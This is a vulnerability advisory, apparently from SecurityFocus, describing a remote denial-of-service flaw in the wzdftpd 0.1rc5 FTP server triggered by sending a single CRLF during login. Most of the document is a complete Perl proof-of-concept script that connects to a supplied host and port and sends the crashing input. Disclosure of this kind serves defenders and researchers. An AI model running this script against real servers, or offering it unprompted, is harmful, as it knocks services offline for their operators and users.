source: http://www.securityfocus.com/bid/8678/info

It has been reported that wzftpd is prone to a remote denial of service condition due to malicious user-supplied input. The problem is reported to present itself when a remote attacker sends a single CRLF character to the vulnerable program during the login process. This attack may cause the software to improperly handle the exceptional condition and lead to a crash.

Successful exploitation of this attack may allow a remote attacker to cause the vulnerable process to crash.

wzdftpd version 0.1rc5 has been reported to be prone to this vulnerability, however other version across various platforms may be affected as well. 

#!/usr/bin/perl
#
#   ####################################
#   #     Proof of concept for         #
#   # WZDFTPD FTP Server version 0.1rc5 #
#   ####################################
#
# http://www.moozatech.com/mt-23-09-2003.txt
#
# Usage: perl mooza1.pl [host] [port]
use IO::Socket;

$host = $ARGV[0];
$port = $ARGV[1];
print "\n#####################################\n\n";
print "Proof-Of-Concept for wzdftpd v0.1rc5.\n";
print "this code is for demonstration only.\n";
print "Use it under your own responsebility.\n";
print "\n#####################################\n\n";

if (defined $host && defined $port ) {
} else {
  print "Oops, Something is missing.\n";
  die "Usage: perl mooza1.pl [host] [port]\n";
}

print "Connecting to $host:$port... ";

$socket = IO::Socket::INET->new(PeerAddr => $host, PeerPort => $port,
 Proto => "tcp", Type=> SOCK_STREAM) or die "Failed, Cant connect?\n";
print "OK\n";
sleep 1;
print "Sending Dos..\n";
sleep 2;
print $socket "\r\n";
$socket->autoflush(1);

sleep 2;
print "we are done here..\n\n";
close($socket);